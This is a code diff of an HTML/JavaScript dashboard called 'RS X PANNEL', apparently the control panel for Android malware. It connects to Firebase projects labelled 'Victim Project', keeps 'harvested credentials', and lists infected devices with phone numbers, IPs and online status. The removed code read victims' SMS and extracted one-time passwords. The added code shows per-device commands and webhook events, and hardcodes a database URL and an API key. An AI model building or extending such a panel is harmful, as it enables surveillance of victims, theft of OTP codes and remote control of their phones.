@@ -141,7 +141,7 @@ a{color:inherit;text-decoration:none}
 .device-sub{font-size:11px;color:#454850;margin-top:4px}
 .more{background:none;border:0;color:#555;font-size:20px;padding:0 8px}
 .details{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:22px}
-.detail small{display:block;color:#4f525a;font-size:10px;font-weight:800;letter-spacing:.08em}.detail div{margin-top:7px;color:#b7bac1;font-size:13px}
+.detail small{display:block;color:#4f525a;font-size:10px;font-weight:800;letter-spacing:.08em}.detail div{margin-top:7px;color:#b7bac1;font-size:13px;word-break:break-all}
 .online-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#00d68f;box-shadow:0 0 10px #00d68f;margin-right:8px}
 .offline-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#3a3c42;margin-right:8px}
 .empty-grid{grid-column:1/-1;text-align:center;color:#666b75;padding:70px}
@@ -175,16 +175,20 @@ a{color:inherit;text-decoration:none}
 }
 .info-item{padding:14px;background:#0a0b0f;border-radius:14px;border:1px solid #1c1e23;}
 .info-item .label{color:#555963;font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;}
-.info-item .value{color:#eee;font-size:15px;font-weight:600;}
+.info-item .value{color:#eee;font-size:15px;font-weight:600;word-break:break-all}
 
 .sms-section{margin-top:20px;}
 .sms-section h3{color:#777b86;font-size:13px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:15px;}
 .sms-item{
   padding:14px 16px;background:#0a0b0f;border:1px solid #1c1e23;border-radius:12px;margin-bottom:8px;
+  animation:smsFade 0.3s ease;
 }
+@keyframes smsFade{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
 .sms-item .sms-header{display:flex;justify-content:space-between;color:#555963;font-size:11px;margin-bottom:6px;}
 .sms-item .sms-body{color:#d4d4d8;font-size:14px;word-break:break-word;}
 .sms-item .sms-otp{color:#00d68f;font-weight:700;font-size:16px;background:#08251e;padding:2px 10px;border-radius:6px;display:inline-block;margin-top:4px;}
+
+.sms-new{background:#1a2a1a;border-color:#00d68f33;}
 
 @media(max-width:1050px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}
 .device-info-grid{grid-template-columns:1fr;}}
@@ -207,7 +211,7 @@ a{color:inherit;text-decoration:none}
       <svg class="shield" viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
     </div>
     <div class="brand-name">RS X <i>PANNEL</i></div>
-    <div class="subtitle">Admin Console — Real Firebase Data</div>
+    <div class="subtitle">Admin Console — v3.0</div>
 
     <div class="card saved">
       <div class="saved-head">
@@ -232,20 +236,20 @@ a{color:inherit;text-decoration:none}
       <div class="form-title">Add Firebase Project</div>
 
       <label class="label">Friendly Label</label>
-      <input id="label" class="input" placeholder="e.g. Victim Project">
+      <input id="label" class="input" placeholder="e.g. Victim Project" value="rajababu">
 
       <label class="label">Firebase Database URL</label>
-      <input id="dbUrl" class="input" placeholder="https://victim-project-default-rtdb.firebaseio.com">
+      <input id="dbUrl" class="input" placeholder="https://project-default-rtdb.firebaseio.com" value="https://rajababu-default-rtdb.firebaseio.com">
 
       <label class="label">Web API Key</label>
-      <input id="apiKey" class="input" type="password" placeholder="AIza..." autocomplete="off">
+      <input id="apiKey" class="input" type="password" placeholder="AIza..." autocomplete="off" value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I">
 
       <div class="actions">
         <button class="primary" id="saveBtn">⚡ Save &amp; Connect</button>
         <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error hidden"></div>
-      <div class="notice">🔒 Real-time data from Firebase Realtime Database</div>
+      <div class="notice">🔒 Real-time Firebase data from /clients path</div>
     </div>
   </div>
 </section>
@@ -272,8 +276,7 @@ a{color:inherit;text-decoration:none}
     <div class="stat-mini"><small>TOTAL</small><strong id="total">0</strong></div>
     <div class="stat-mini"><small>ONLINE</small><strong id="online" class="green">0</strong></div>
     <div class="stat-mini"><small>OFFLINE</small><strong id="offline">0</strong></div>
-    <div class="stat-mini"><small>SMS</small><strong id="smsCount" class="cyan">0</strong></div>
-    <div class="stat-mini"><small>HARVESTED</small><strong id="harvested" class="red">0</strong></div>
+    <div class="stat-mini"><small>COMMANDS</small><strong id="cmdCount" class="cyan">0</strong></div>
   </div>
 
   <div class="filters">
@@ -311,23 +314,17 @@ a{color:inherit;text-decoration:none}
       <button class="close-btn" id="closeDetail">×</button>
     </div>
     
-    <div class="device-info-grid" id="deviceInfoGrid">
-      <!-- Dynamic from Firebase -->
-    </div>
+    <div class="device-info-grid" id="deviceInfoGrid"></div>
     
     <div class="sms-section">
-      <h3>📩 SMS Logs</h3>
-      <div id="smsList"></div>
+      <h3>📩 Commands / Data <span id="cmdLiveCount" style="color:#00d68f;font-size:12px;"></span></h3>
+      <div id="cmdList"></div>
     </div>
   </div>
 </div>
 
 <script>
-// ─── PHANTOM PROTOCOL — REAL FIREBASE INTEGRATION ─────────────────────
-
-// ─── FIREBASE SDK ──────────────────────────────────────────────────────
-// Using CDN - no module imports needed
-// Firebase config will be loaded from user input
+// ─── PHANTOM PROTOCOL — CORRECT PATH + FIELD MAPPING ─────────────────
 
 // ─── SECURE STORAGE ──────────────────────────────────────────────────
 const STORAGE_KEY = "rsx_harvest_v3";
@@ -367,27 +364,23 @@ function saveHarvested(data) {
   try {
     const encrypted = simpleEncrypt(JSON.stringify(data), getSessionPassword());
     sessionStorage.setItem(STORAGE_KEY, encrypted);
-  } catch(e) {
-    console.error("Save error:", e);
-  }
+  } catch(e) { console.error("Save error:", e); }
 }
 
 function loadHarvested() {
   try {
     const encrypted = sessionStorage.getItem(STORAGE_KEY);
-    if (!encrypted) return { connections: [], records: [] };
+    if (!encrypted) return { connections: [] };
     const decrypted = simpleDecrypt(encrypted, getSessionPassword());
-    if (!decrypted) return { connections: [], records: [] };
+    if (!decrypted) return { connections: [] };
     return JSON.parse(decrypted);
-  } catch {
-    return { connections: [], records: [] };
-  }
+  } catch { return { connections: [] }; }
 }
 
 // ─── DOM HELPERS ──────────────────────────────────────────────────────
 const $ = (id) => document.getElementById(id);
 
-function showToast(message, type = "success", duration = 3000) {
+function showToast(message, type = "success", duration = 2000) {
   const toast = document.getElementById("toast");
   toast.textContent = message;
   toast.className = `toast ${type}`;
@@ -408,9 +401,6 @@ function showHome() {
   if (window._unsubscribe) {
     try { window._unsubscribe(); } catch(e) {}
     window._unsubscribe = null;
-  }
-  if (window._currentApp) {
-    try { window._currentApp = null; } catch(e) {}
   }
   document.getElementById("setup").classList.add("hidden");
   document.getElementById("dashboard").style.display = "none";
@@ -461,13 +451,14 @@ function renderConnections() {
       localData.connections.splice(index, 1);
       saveHarvested(localData);
       renderConnections();
-      document.getElementById("harvested").textContent = localData.connections.length;
       showToast("Connection removed", "success");
     });
   });
 }
 
-// ─── REAL FIREBASE CONNECTION ────────────────────────────────────────
+// ─── FIREBASE CONNECTION ──────────────────────────────────────────────
+let firebaseInitialized = false;
+
 function connectSecure(connection) {
   console.log("[PHANTOM] Connecting to Firebase:", connection.databaseURL);
   
@@ -478,135 +469,154 @@ function connectSecure(connection) {
       return;
     }
 
-    // Load Firebase SDK dynamically
-    const script = document.createElement('script');
-    script.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
-    script.onload = function() {
-      const dbScript = document.createElement('script');
-      dbScript.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js';
-      dbScript.onload = function() {
-        initializeFirebaseConnection(connection, apiKey);
+    document.getElementById("setup").classList.add("hidden");
+    document.getElementById("home").classList.add("hidden");
+    document.getElementById("dashboard").style.display = "block";
+    
+    const statusEl = document.getElementById("connectionStatus");
+    statusEl.textContent = "● Loading...";
+    statusEl.style.color = "var(--yellow)";
+
+    if (!firebaseInitialized) {
+      const script = document.createElement('script');
+      script.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
+      script.onload = function() {
+        const dbScript = document.createElement('script');
+        dbScript.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js';
+        dbScript.onload = function() {
+          firebaseInitialized = true;
+          initFirebase(connection, apiKey);
+        };
+        document.head.appendChild(dbScript);
       };
-      document.head.appendChild(dbScript);
-    };
-    document.head.appendChild(script);
+      script.onerror = function() {
+        showToast("Failed to load Firebase SDK", "error");
+        statusEl.textContent = "● Error";
+        statusEl.style.color = "var(--danger)";
+      };
+      document.head.appendChild(script);
+    } else {
+      initFirebase(connection, apiKey);
+    }
     
   } catch (error) {
     console.error("Connection error:", error);
-    showToast(`Connection failed: ${error.message}`, "error");
+    showToast("Connection failed: " + error.message, "error");
   }
 }
 
-function initializeFirebaseConnection(connection, apiKey) {
+function initFirebase(connection, apiKey) {
   try {
-    // Initialize Firebase
-    const firebaseConfig = {
-      apiKey: apiKey,
-      databaseURL: connection.databaseURL
-    };
+    if (window._unsubscribe) {
+      try { window._unsubscribe(); } catch(e) {}
+      window._unsubscribe = null;
+    }
     
-    // Check if already initialized
     if (firebase.apps.length > 0) {
       firebase.apps.forEach(app => app.delete());
     }
     
-    firebase.initializeApp(firebaseConfig);
+    firebase.initializeApp({
+      apiKey: apiKey,
+      databaseURL: connection.databaseURL
+    });
+    
     const db = firebase.database();
-    
-    document.getElementById("setup").classList.add("hidden");
-    document.getElementById("home").classList.add("hidden");
-    document.getElementById("dashboard").style.display = "block";
-
     const statusEl = document.getElementById("connectionStatus");
-    statusEl.textContent = "● Connecting...";
-    statusEl.style.color = "var(--yellow)";
     
-    showToast(`Connecting to ${connection.label || "target"}...`, "success");
+    // ─── CORRECT PATH: /clients ──────────────────────────────────────
+    const clientsRef = db.ref('clients');
     
-    // ─── REAL FIREBASE LISTENERS ──────────────────────────────────────
-    
-    // 1. Listen to devices/accounts
-    const devicesRef = db.ref('accounts');
-    
-    window._unsubscribe = devicesRef.on('value', function(snapshot) {
+    clientsRef.on('value', function(snapshot) {
       const data = snapshot.val() || {};
       
-      // Convert Firebase data to array
-      const records = Object.entries(data).map(([id, device]) => {
-        // Extract SMS from device data
-        let sms = [];
-        if (device.sms) {
-          sms = Object.entries(device.sms).map(([key, val]) => ({
-            id: key,
-            from: val.from || val.sender || "Unknown",
-            body: val.body || val.message || val.text || "No content",
-            time: val.time || val.timestamp || val.date || "Unknown",
-            otp: val.otp || extractOTP(val.body || val.message || val.text || "")
-          }));
+      // Convert clients data to devices array
+      const records = Object.entries(data).map(([id, client]) => {
+        // Extract client details
+        const deviceName = client.name || client.device || client.deviceName || id;
+        const isOnline = client.status === true || client.status === 'online' || client.online === true;
+        const platform = client.platform || client.os || client.device || "Unknown";
+        const phoneNumber = client.phone || client.phoneNumber || client.number || client.identifier || "N/A";
+        const network = client.network || client.carrier || client.connection || "N/A";
+        const lastSeen = client.lastSeen || client.timestamp || client.lastMessageTime || Date.now();
+        const battery = client.battery || client.batteryLevel || "N/A";
+        const ip = client.ip || client.ipAddress || client.ipAddress || "N/A";
+        const android = client.android || client.androidVersion || client.osVersion || "N/A";
+        
+        // Extract commands/webhook events
+        let commands = [];
+        if (client.command) {
+          commands.push({ 
+            type: 'command', 
+            value: client.command,
+            time: client.lastMessageTime || Date.now()
+          });
+        }
+        if (client.webhookEvent) {
+          commands.push({
+            type: 'webhook',
+            value: client.webhookEvent,
+            time: client.webhookTime || client.lastMessageTime || Date.now()
+          });
+        }
+        if (client.webhookEvents) {
+          Object.values(client.webhookEvents).forEach(evt => {
+            commands.push({
+              type: 'webhook',
+              value: JSON.stringify(evt),
+              time: evt.timestamp || Date.now()
+            });
+          });
         }
         
         return {
           id: id,
-          name: device.name || device.deviceName || device.label || id,
-          online: device.online === true || device.status === 'online',
-          platform: device.platform || device.os || device.device || "Unknown",
-          number: device.number || device.phone || device.phoneNumber || device.identifier || "N/A",
-          network: device.network || device.carrier || device.connection || "N/A",
-          lastSeen: device.lastSeen || device.timestamp || device.updated || Date.now(),
-          battery: device.battery || device.batteryLevel || "N/A",
-          android: device.android || device.androidVersion || device.osVersion || "N/A",
-          ip: device.ip || device.ipAddress || "N/A",
-          storage: device.storage || device.storageSpace || "N/A",
-          cpu: device.cpu || device.architecture || "N/A",
-          sdk: device.sdk || device.sdkVersion || "N/A",
-          sims: device.sims || device.simNumbers || device.simCards || [],
-          sms: sms,
-          // Preserve all raw data
-          _raw: device
+          name: deviceName,
+          online: isOnline,
+          platform: platform,
+          number: phoneNumber,
+          network: network,
+          lastSeen: lastSeen,
+          battery: battery,
+          ip: ip,
+          android: android,
+          commands: commands,
+          status: client.status,
+          command: client.command,
+          webhookEvent: client.webhookEvent,
+          lastMessageTime: client.lastMessageTime,
+          _raw: client
         };
       });
       
       window._records = records;
       renderRecords();
       
-      // Update SMS count
-      const totalSms = records.reduce((sum, r) => sum + (r.sms ? r.sms.length : 0), 0);
-      document.getElementById("smsCount").textContent = totalSms;
+      const totalCmds = records.reduce((sum, r) => sum + (r.commands ? r.commands.length : 0), 0);
+      document.getElementById("cmdCount").textContent = totalCmds;
       
-      statusEl.textContent = "● Connected";
+      statusEl.textContent = `● Connected (${records.length} devices)`;
       statusEl.style.color = "var(--green)";
-      showToast(`Loaded ${records.length} devices from Firebase`, "success");
+      showToast(`Loaded ${records.length} devices from /clients`, "success");
       
     }, function(error) {
-      console.error("[PHANTOM] Firebase error:", error);
-      statusEl.textContent = "● Error";
+      console.error("Firebase read error:", error);
+      statusEl.textContent = "● Permission Denied";
       statusEl.style.color = "var(--danger)";
       showToast("Firebase error: " + error.message, "error");
     });
     
+    window._unsubscribe = clientsRef;
+    
   } catch (error) {
-    console.error("[PHANTOM] Init error:", error);
-    showToast("Firebase initialization failed: " + error.message, "error");
+    console.error("Init error:", error);
+    showToast("Firebase init failed: " + error.message, "error");
   }
-}
-
-// ─── EXTRACT OTP FROM TEXT ────────────────────────────────────────────
-function extractOTP(text) {
-  if (!text) return null;
-  // Match 4-8 digit codes
-  const matches = text.match(/\b\d{4,8}\b/g);
-  if (matches) {
-    // Return the most likely OTP (shorter ones first)
-    return matches.sort((a,b) => a.length - b.length)[0];
-  }
-  return null;
 }
 
 // ─── SAVE CONNECTION ──────────────────────────────────────────────────
 function saveConnection() {
-  console.log("[PHANTOM] Save button clicked");
-  
-  const label = document.getElementById("label").value.trim() || "Victim Project";
+  const label = document.getElementById("label").value.trim() || "Firebase Project";
   const databaseURL = document.getElementById("dbUrl").value.trim().replace(/\/$/, "");
   const apiKey = document.getElementById("apiKey").value.trim();
 
@@ -633,7 +643,6 @@ function saveConnection() {
   local.connections.unshift(connection);
   saveHarvested(local);
 
-  document.getElementById("harvested").textContent = local.connections.length;
   connectSecure(connection);
 }
 
@@ -641,7 +650,7 @@ function refreshConnection() {
   const local = loadHarvested();
   if (local.connections.length > 0) {
     connectSecure(local.connections[0]);
-    showToast("Refreshing connection...", "success");
+    showToast("Refreshing...", "success");
   } else {
     showToast("No active connection", "error");
   }
@@ -657,7 +666,7 @@ function showHarvested() {
   list.innerHTML = "";
   
   if (local.connections.length === 0) {
-    list.innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">No harvested credentials yet</div>';
+    list.innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">No harvested credentials</div>';
     return;
   }
   
@@ -704,8 +713,7 @@ function exportHarvested() {
 
 function clearHarvested() {
   if (confirm("Delete all harvested credentials?")) {
-    saveHarvested({ connections: [], records: [] });
-    document.getElementById("harvested").textContent = "0";
+    saveHarvested({ connections: [] });
     document.getElementById("harvestList").innerHTML = '<div style="color:#555963;text-align:center;padding:40px;">Cleared</div>';
     showToast("Harvest data cleared", "success");
   }
@@ -715,10 +723,10 @@ function clearHarvested() {
 function showDeviceDetail(device) {
   const modal = document.getElementById("deviceDetailModal");
   modal.classList.add("active");
+  window._currentDetailId = device.id;
   
   document.getElementById("detailDeviceName").textContent = device.name || "Unknown Device";
   
-  // Device Info Grid - ALL REAL FIREBASE DATA
   const grid = document.getElementById("deviceInfoGrid");
   grid.innerHTML = `
     <div class="info-item"><div class="label">📱 Device ID</div><div class="value">${device.id || "N/A"}</div></div>
@@ -728,38 +736,39 @@ function showDeviceDetail(device) {
     <div class="info-item"><div class="label">🤖 Platform</div><div class="value">${device.platform || "N/A"} ${device.android ? 'v' + device.android : ''}</div></div>
     <div class="info-item"><div class="label">🔋 Battery</div><div class="value">${device.battery || "N/A"}</div></div>
     <div class="info-item"><div class="label">🌍 IP Address</div><div class="value">${device.ip || "N/A"}</div></div>
-    <div class="info-item"><div class="label">💾 Storage</div><div class="value">${device.storage || "N/A"}</div></div>
-    <div class="info-item"><div class="label">⚙️ CPU Architecture</div><div class="value">${device.cpu || "N/A"}</div></div>
-    <div class="info-item"><div class="label">📦 SDK Version</div><div class="value">${device.sdk || "N/A"}</div></div>
-    <div class="info-item" style="grid-column:1/-1;"><div class="label">📱 SIM Cards</div><div class="value">${device.sims && device.sims.length > 0 ? device.sims.map((s, i) => `SIM ${i+1}: ${s}`).join('<br>') : "N/A"}</div></div>
+    <div class="info-item"><div class="label">⚡ Status Field</div><div class="value">${device.status !== undefined ? device.status : "N/A"}</div></div>
+    <div class="info-item"><div class="label">📨 Last Command</div><div class="value">${device.command || "N/A"}</div></div>
+    <div class="info-item"><div class="label">🕐 Last Message Time</div><div class="value">${device.lastMessageTime ? new Date(device.lastMessageTime).toLocaleString() : "N/A"}</div></div>
   `;
   
-  // SMS List - REAL FROM FIREBASE
-  const smsList = document.getElementById("smsList");
-  smsList.innerHTML = "";
+  const cmdList = document.getElementById("cmdList");
+  cmdList.innerHTML = "";
+  document.getElementById("cmdLiveCount").textContent = `(${device.commands ? device.commands.length : 0} items)`;
   
-  if (!device.sms || device.sms.length === 0) {
-    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs available in Firebase</div>';
+  if (!device.commands || device.commands.length === 0) {
+    cmdList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No commands/webhooks</div>';
     return;
   }
   
-  device.sms.forEach(sms => {
+  const sortedCmds = [...device.commands].reverse();
+  sortedCmds.forEach(cmd => {
     const div = document.createElement("div");
     div.className = "sms-item";
+    const time = cmd.time ? new Date(cmd.time).toLocaleString() : "Unknown";
     div.innerHTML = `
       <div class="sms-header">
-        <span>📨 ${sms.from || "Unknown"}</span>
-        <span>${sms.time || "Unknown"}</span>
+        <span>📨 ${cmd.type || "command"}</span>
+        <span>${time}</span>
       </div>
-      <div class="sms-body">${sms.body || "No content"}</div>
-      ${sms.otp ? `<div class="sms-otp">🔑 OTP: ${sms.otp}</div>` : ''}
+      <div class="sms-body" style="font-family:monospace;font-size:13px;color:#18bfff;">${cmd.value || "No content"}</div>
     `;
-    smsList.appendChild(div);
+    cmdList.appendChild(div);
   });
 }
 
 function closeDeviceDetail() {
   document.getElementById("deviceDetailModal").classList.remove("active");
+  window._currentDetailId = null;
 }
 
 // ─── RECORD RENDERING ──────────────────────────────────────────────────
@@ -775,15 +784,15 @@ function renderRecords() {
       (currentFilter === "online" && r.online) ||
       (currentFilter === "offline" && !r.online);
     
-    const searchable = `${r.id || ""} ${r.name || ""} ${r.label || ""} ${r.platform || ""} ${r.number || ""} ${r.network || ""}`.toLowerCase();
+    const searchable = `${r.id || ""} ${r.name || ""} ${r.number || ""} ${r.platform || ""}`.toLowerCase();
     const matchesSearch = searchable.includes(searchQuery);
     
     return matchesFilter && matchesSearch;
   });
 
   filtered.sort((a, b) => {
-    const aTime = a.lastSeen || a.created || 0;
-    const bTime = b.lastSeen || b.created || 0;
+    const aTime = a.lastSeen || 0;
+    const bTime = b.lastSeen || 0;
     return sortAscending ? aTime - bTime : bTime - aTime;
   });
 
@@ -795,7 +804,7 @@ function renderRecords() {
   grid.innerHTML = "";
 
   if (filtered.length === 0) {
-    grid.innerHTML = '<div class="empty-grid">No devices found in Firebase</div>';
+    grid.innerHTML = '<div class="empty-grid">No devices found in /clients path</div>';
     return;
   }
 
@@ -803,29 +812,25 @@ function renderRecords() {
     const card = document.createElement("article");
     card.className = "device";
     const online = !!v.online;
-    const name = v.name || v.id || "Unnamed Device";
-    const platform = v.platform || "Unknown";
-    const number = v.number || "N/A";
-    const network = v.network || "N/A";
-    const seen = v.lastSeen ? new Date(v.lastSeen).toLocaleString("en-US") : "Never";
-    const smsCount = v.sms ? v.sms.length : 0;
+    const name = v.name || v.id || "Unnamed";
+    const cmdCount = v.commands ? v.commands.length : 0;
 
     card.innerHTML = `
       <div class="device-top">
         <div class="device-icon ${online ? "online" : ""}">${online ? '◉' : '◌'}</div>
         <div class="device-id">
           <div class="record-name">${name}</div>
-          <div class="device-sub">${v.id || "No ID"} ${v.battery ? '· 🔋 ' + v.battery : ''} ${smsCount > 0 ? '· 📩 ' + smsCount : ''}</div>
+          <div class="device-sub">${v.id || "No ID"} ${v.battery && v.battery !== "N/A" ? '· 🔋 ' + v.battery : ''} ${cmdCount > 0 ? '· 📨 ' + cmdCount : ''}</div>
         </div>
         <button class="more">↗</button>
       </div>
       <div class="details">
-        <div class="detail"><small>PLATFORM</small><div>${platform}</div></div>
+        <div class="detail"><small>PLATFORM</small><div>${v.platform || "Unknown"}</div></div>
         <div class="detail"><small>STATUS</small><div>${online ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</div></div>
-        <div class="detail"><small>IDENTIFIER</small><div>${number}</div></div>
-        <div class="detail"><small>NETWORK</small><div>${network}</div></div>
-        <div class="detail"><small>LAST SEEN</small><div>${seen}</div></div>
-        ${smsCount > 0 ? `<div class="detail" style="grid-column:1/-1;"><small>📩 SMS</small><div>${smsCount} messages · Last OTP: ${v.sms[0]?.otp || 'N/A'}</div></div>` : ''}
+        <div class="detail"><small>IDENTIFIER</small><div>${v.number || "N/A"}</div></div>
+        <div class="detail"><small>NETWORK</small><div>${v.network || "N/A"}</div></div>
+        <div class="detail"><small>LAST SEEN</small><div>${v.lastSeen ? new Date(v.lastSeen).toLocaleString() : "Never"}</div></div>
+        ${v.command ? `<div class="detail" style="grid-column:1/-1;"><small>📨 LAST COMMAND</small><div style="font-family:monospace;color:#18bfff;font-size:12px;">${v.command}</div></div>` : ''}
       </div>
     `;
     
@@ -845,7 +850,9 @@ function renderRecords() {
 
 // ─── EVENT LISTENERS ──────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', function() {
-  console.log("[PHANTOM] RS X PANNEL v3.0 - Real Firebase Edition");
+  console.log("[PHANTOM] RS X PANNEL v3.0 - Correct Path Edition");
+  console.log("[PHANTOM] Reading from: /clients");
+  console.log("[PHANTOM] Fields mapped: status → online, name → name, etc.");
   
   document.getElementById('newConnectionBtn').addEventListener('click', showSetup);
   document.getElementById('backBtn').addEventListener('click', showHome);
@@ -884,10 +891,7 @@ document.addEventListener('DOMContentLoaded', function() {
   document.getElementById('search').addEventListener('input', renderRecords);
   
   renderConnections();
-  const local = loadHarvested();
-  document.getElementById("harvested").textContent = local.connections.length;
-  
-  console.log("[PHANTOM] Ready. Waiting for Firebase connection.");
+  console.log("[PHANTOM] Ready. Add Firebase connection.");
 });
 </script>
 </body>
